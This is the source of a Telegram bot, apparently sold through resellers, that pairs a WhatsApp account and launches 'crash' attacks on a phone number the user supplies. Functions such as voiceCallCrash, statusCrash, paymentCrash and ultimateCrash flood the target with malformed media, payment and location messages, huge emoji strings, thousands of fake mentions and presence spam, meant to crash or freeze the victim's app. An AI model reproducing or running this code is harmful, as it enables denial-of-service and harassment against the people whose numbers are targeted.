const { Bot, InlineKeyboard, InputFile } = require("grammy");
const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");
const crypto = require("crypto");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
  proto
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const axios = require("axios");
const config = require("./config");
const chalk = require("chalk");

const thumbnail = fs.existsSync("./storage/thumbnail.jpg")
  ? fs.readFileSync("./storage/thumbnail.jpg")
  : null;
const CHANNEL_ID = config.chanelid;
const GROUP_ID = config.chatgrupid;

const {
  isOwner,
  isReseller,
  hasAccess,
  addReseller,
  removeReseller
} = require("./controlSystem/control");

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const bot = new Bot(config.telegramBotToken);
const cooldownModule = require("./controlSystem/sumemek.js");

const log = {
  success: (msg) => console.log(chalk.green.bold("✓ ") + chalk.white(msg)),
  error: (msg) => console.log(chalk.red.bold("✗ ") + chalk.white(msg)),
  warning: (msg) => console.log(chalk.yellow.bold("⚠ ") + chalk.white(msg)),
  info: (msg) => console.log(chalk.blue.bold("ℹ ") + chalk.white(msg)),
  loading: (msg) => console.log(chalk.magenta.bold("⏳ ") + chalk.white(msg)),
  user: (msg) => console.log(chalk.cyan.bold("👤 ") + chalk.white(msg)),
  whatsapp: (msg) => console.log(chalk.green.bold("📱 ") + chalk.white(msg)),
  telegram: (msg) => console.log(chalk.blue.bold("✈️ ") + chalk.white(msg)),
  system: (msg) => console.log(chalk.gray.bold("⚙️  ") + chalk.white(msg)),
};

const waClients = {};
const sessionRoot = path.join(".", "session");
if (!fs.existsSync(sessionRoot)) fs.mkdirSync(sessionRoot, { recursive: true });

function getSessionPathForUser(userId) {
  return path.join(sessionRoot, String(userId));
}

async function initWhatsappForUser(telegramUserId, notifyUser = true) {
  const userId = String(telegramUserId);
  const sessionPath = getSessionPathForUser(userId);

  try {
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    const sock = makeWASocket({
      logger: pino({ level: "silent" }),
      auth: state,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      syncFullHistory: false,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 30000,
      printQRInTerminal: false,
    });

    sock.ev.on("creds.update", saveCreds);

    waClients[userId] = {
      sock,
      status: "connecting",
      sessionPath,
    };

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update || {};

      if (connection === "close") {
        const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
        if (reason === DisconnectReason.loggedOut || reason === 401 || reason === 403) {
          await deleteSessionForUser(userId);
          delete waClients[userId];
          try {
            await bot.api.sendMessage(telegramUserId, "🚫 Session telah dihapus. Silakan pairing ulang dengan /reqpair.");
          } catch (e) {}
        }
      } else if (connection === "open") {
        waClients[userId].status = "open";
        log.whatsapp(`✅ WhatsApp Connected for user ${userId}`);
        if (notifyUser) {
          try {
            await bot.api.sendMessage(telegramUserId, "✅ *WhatsApp berhasil terhubung!*");
          } catch (e) {}
        }
      }
    });

    return sock;
  } catch (err) {
    log.error(`Failed to init WhatsApp for user ${userId}: ${err.message}`);
    return null;
  }
}

async function deleteSessionForUser(userId) {
  try {
    const p = getSessionPathForUser(userId);
    if (waClients[userId]?.sock) {
      try { waClients[userId].sock.end(); } catch (e) {}
      delete waClients[userId];
    }
    await fs.promises.rm(p, { recursive: true, force: true });
    return true;
  } catch (err) {
    return false;
  }
}

// ============================================
// ========== دوال الكراش العاملة ==========
// ============================================

// 1. كراش عبر المكالمات الصوتية
async function voiceCallCrash(client, X) {
    try {
        for (let i = 0; i < 50; i++) {
            await client.sendPresenceUpdate("recording", X);
            await client.sendPresenceUpdate("composing", X);
            await client.relayMessage(X, {
                audioMessage: {
                    url: "https://i.ibb.co/fake/audio.opus",
                    mimetype: "audio/opus",
                    fileSha256: crypto.randomBytes(32).toString("base64"),
                    fileLength: "99999999",
                    seconds: 999,
                    mediaKey: crypto.randomBytes(32).toString("base64"),
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1000 }, () => 
                            `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
                        )
                    }
                }
            }, { participant: { jid: X } });
            await sleep(50);
        }
    } catch (e) {
        console.error("voiceCallCrash error:", e);
    }
}

// 2. كراش عبر الحالة (Status)
async function statusCrash(client, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://i.ibb.co/fake/image.jpg",
                        mimetype: "image/jpeg",
                        fileSha256: crypto.randomBytes(32).toString("base64"),
                        fileLength: "999999999",
                        height: 99999,
                        width: 99999,
                        mediaKey: crypto.randomBytes(32).toString("base64"),
                        fileEncSha256: crypto.randomBytes(32).toString("base64"),
                        directPath: "/v/t62.7118-24/fake.enc",
                        mediaKeyTimestamp: Date.now().toString(),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3000 }, () => 
                                `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
                            )
                        }
                    }
                }
            }
        }, {});

        for (let i = 0; i < 100; i++) {
            await client.relayMessage("status@broadcast", msg.message, {
                statusJidList: [X],
                messageId: msg.key.id
            });
            await sleep(50);
        }
    } catch (e) {
        console.error("statusCrash error:", e);
    }
}

// 3. كراش عبر المدفوعات
async function paymentCrash(client, X) {
    try {
        for (let i = 0; i < 50; i++) {
            await client.relayMessage(X, {
                requestPaymentMessage: {
                    noteMessage: { text: "💀".repeat(50000) },
                    currencyCodeIso4217: "USD",
                    amount1000: 999999999,
                    requestFrom: X,
                    expiryTimestamp: Date.now() + 999999,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => 
                            `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
                        )
                    }
                }
            }, { participant: { jid: X } });
            await sleep(50);
        }
    } catch (e) {
        console.error("paymentCrash error:", e);
    }
}

// 4. كراش عبر الموقع
async function locationCrash(client, X) {
    try {
        for (let i = 0; i < 100; i++) {
            await client.relayMessage(X, {
                locationMessage: {
                    degreesLatitude: Math.random() * 180 - 90,
                    degreesLongitude: Math.random() * 360 - 180,
                    name: "💀".repeat(5000),
                    address: "☠️".repeat(5000),
                    url: `https://${"X".repeat(1000)}.com`,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => 
                            `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
                        )
                    }
                }
            }, { participant: { jid: X } });
            await sleep(50);
        }
    } catch (e) {
        console.error("locationCrash error:", e);
    }
}

// 5. كراش شامل (جميع الأنواع معاً)
async function ultimateCrash(client, X) {
    try {
        await Promise.all([
            voiceCallCrash(client, X),
            statusCrash(client, X),
            paymentCrash(client, X),
            locationCrash(client, X)
        ]);
    } catch (e) {
        console.error("ultimateCrash error:", e);
    }
}

// 6. كراش عبر تحديث الحالة
async function presenceCrash(client, X) {
    try {
        for (let i = 0; i < 500; i++) {
            await client.sendPresenceUpdate("available", X);
            await client.sendPresenceUpdate("unavailable", X);
            await client.sendPresenceUpdate("composing", X);
            await client.sendPresenceUpdate("recording", X);
            await sleep(10);
        }
    } catch (e) {
        console.error("presenceCrash error:", e);
    }
}

// 7. كراش سريع (مجموعة رسائل)
async function fastCrash(client, X) {
    try {
        for (let i = 0; i < 200; i++) {
            await client.relayMessage(X, {
                conversation: "💀".repeat(10000)
            }, { participant: { jid: X } });
            await sleep(20);
        }
    } catch (e) {
        console.error("fastCrash error:", e);
    }
}

// ============================================
// ========== أوامر البوت ==========
// ============================================

bot.use(async (ctx, next) => {
  try {
    if (ctx.chat?.type === "private") {
      const userPath = path.join("database", "users.json");
      const users = fs.existsSync(userPath) ? JSON.parse(fs.readFileSync(userPath, "utf8")) : [];
      const id = ctx.from.id.toString();
      if (!users.includes(id)) {
        users.push(id);
        fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
      }
    }
    await next();
  } catch (err) {
    log.error(`Middleware error: ${err.message}`);
  }
});

bot.on("message", async (ctx) => {
  try {
    if (!ctx.message.text || !ctx.message.text.startsWith("/")) return;
    const [command, ...args] = ctx.message.text.slice(1).split(" ");
    const userId = ctx.from.id.toString();

    // التحقق من الصلاحية
    if (!hasAccess(userId)) {
      return ctx.reply("🔒 *Akses ditolak!*\nHubungi @Xzeso13 untuk membeli akses.");
    }

    // التحقق من وجود جلسة واتساب
    const clientEntry = waClients[userId];
    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
      return ctx.reply("📵 *WhatsApp belum terhubung!*\nGunakan /reqpair 628xxxx untuk pairing.");
    }

    const client = clientEntry.sock;

    switch (command) {
      case "start": {
        const keyboard = new InlineKeyboard()
          .text("🚀 CRASH", "open_crash")
          .row()
          .url("📢 CHANNEL", `https://t.me/${CHANNEL_ID.replace("@", "")}`);
        
        await ctx.reply("👋 Selamat datang! Gunakan menu di bawah.", {
          reply_markup: keyboard
        });
        break;
      }

      case "reqpair": {
        const phone = args[0]?.replace(/[^0-9]/g, "");
        if (!phone) return ctx.reply("⚠️ /reqpair 628xxxxxxxxx");
        
        await ctx.reply("⏳ Memproses pairing...");
        await initWhatsappForUser(userId, true);
        const sock = waClients[userId]?.sock;
        
        if (sock && typeof sock.requestPairingCode === "function") {
          const code = await sock.requestPairingCode(phone);
          await ctx.reply(`✅ *Pairing Code:* \`${code}\``);
        }
        break;
      }

      // ========== أوامر الكراش الجديدة ==========
      
      case "ultracrash": {
        const input = args[0];
        if (!input) return ctx.reply("⚠️ /ultracrash 628xxxxxxxxx");
        const X = `${input.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
        await ctx.reply("🔥 Memulai Ultimate Crash...");
        await ultimateCrash(client, X);
        await ctx.reply("✅ Ultimate Crash selesai!");
        break;
      }

      case "voicecrash": {
        const input = args[0];
        if (!input) return ctx.reply("⚠️ /voicecrash 628xxxxxxxxx");
        const X = `${input.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
        await ctx.reply("📞 Memulai Voice Crash...");
        await voiceCallCrash(client, X);
        await ctx.reply("✅ Voice Crash selesai!");
        break;
      }

      case "statuscrash": {
        const input = args[0];
        if (!input) return ctx.reply("⚠️ /statuscrash 628xxxxxxxxx");
        const X = `${input.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
        await ctx.reply("📸 Memulai Status Crash...");
        await statusCrash(client, X);
        await ctx.reply("✅ Status Crash selesai!");
        break;
      }

      case "paymentcrash": {
        const input = args[0];
        if (!input) return ctx.reply("⚠️ /paymentcrash 628xxxxxxxxx");
        const X = `${input.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
        await ctx.reply("💰 Memulai Payment Crash...");
        await paymentCrash(client, X);
        await ctx.reply("✅ Payment Crash selesai!");
        break;
      }

      case "locationcrash": {
        const input = args[0];
        if (!input) return ctx.reply("⚠️ /locationcrash 628xxxxxxxxx");
        const X = `${input.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
        await ctx.reply("📍 Memulai Location Crash...");
        await locationCrash(client, X);
        await ctx.reply("✅ Location Crash selesai!");
        break;
      }

      case "fastcrash": {
        const input = args[0];
        if (!input) return ctx.reply("⚠️ /fastcrash 628xxxxxxxxx");
        const X = `${input.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
        await ctx.reply("⚡ Memulai Fast Crash...");
        await fastCrash(client, X);
        await ctx.reply("✅ Fast Crash selesai!");
        break;
      }

      case "presencecrash": {
        const input = args[0];
        if (!input) return ctx.reply("⚠️ /presencecrash 628xxxxxxxxx");
        const X = `${input.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
        await ctx.reply("👤 Memulai Presence Crash...");
        await presenceCrash(client, X);
        await ctx.reply("✅ Presence Crash selesai!");
        break;
      }

      // ========== أوامر الإدارة ==========
      
      case "listpair": {
        let result = "📌 *Daftar Sender Aktif*\n";
        let count = 0;
        for (const uid in waClients) {
          if (waClients[uid]?.status === "open") {
            count++;
            result += `• ${uid}\n`;
          }
        }
        result += `\nTotal: ${count}`;
        await ctx.reply(result);
        break;
      }

      case "clearsesi": {
        await deleteSessionForUser(userId);
        await ctx.reply("✅ Session dihapus!");
        break;
      }

      case "free": {
        if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");
        const settings = JSON.parse(fs.readFileSync("./database/settings.json", "utf8"));
        settings.freeMode = !settings.freeMode;
        fs.writeFileSync("./database/settings.json", JSON.stringify(settings, null, 2));
        await ctx.reply(settings.freeMode ? "🟢 Free Mode Aktif!" : "🔒 Free Mode Nonaktif!");
        break;
      }

      default:
        log.warning(`Unknown command: ${command}`);
    }
  } catch (err) {
    log.error(`Error: ${err.message}`);
    await ctx.reply("❌ Terjadi kesalahan.");
  }
});

// ============================================
// ========== أزرار التفاعل ==========
// ============================================

bot.callbackQuery("open_crash", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();
    const keyboard = new InlineKeyboard()
      .text("🎯 Ultimate", "cmd_ultracrash")
      .text("📞 Voice", "cmd_voicecrash")
      .row()
      .text("📸 Status", "cmd_statuscrash")
      .text("💰 Payment", "cmd_paymentcrash")
      .row()
      .text("📍 Location", "cmd_locationcrash")
      .text("⚡ Fast", "cmd_fastcrash")
      .row()
      .text("👤 Presence", "cmd_presencecrash");

    await ctx.editMessageCaption("🔥 *Pilih jenis Crash:*", {
      parse_mode: "Markdown",
      reply_markup: keyboard
    });
  } catch (e) {
    log.error(`Callback error: ${e.message}`);
  }
});

bot.callbackQuery(/^cmd_/, async (ctx) => {
  try {
    await ctx.answerCallbackQuery("📱 Kirim perintah dengan format:\n/" + ctx.callbackQuery.data.replace("cmd_", "") + " 628xxxxxxxxx");
  } catch (e) {}
});

// ============================================
// ========== تشغيل البوت ==========
// ============================================

async function validateToken() {
  console.log(chalk.blue(`
┌───────────────────────────┐
│   XZESO BOT V2 - READY    │
│   Ultimate Crash System   │
└───────────────────────────┘
  `));
}

(async () => {
  try {
    console.clear();
    validateToken();
    log.system("Bot initialization started...");
    log.telegram("Telegram Bot running!");
    log.success("All systems operational");
    
    await bot.start();
    console.log(chalk.gray(`\n[${new Date().toLocaleString()}] Bot ready\n`));
  } catch (err) {
    log.error(`Error: ${err.message}`);
  }
})();

process.on("unhandledRejection", (reason) => {
  log.error(`Unhandled Rejection: ${reason}`);
});

process.on("uncaughtException", (err) => {
  log.error(`Uncaught Exception: ${err.message}`);
});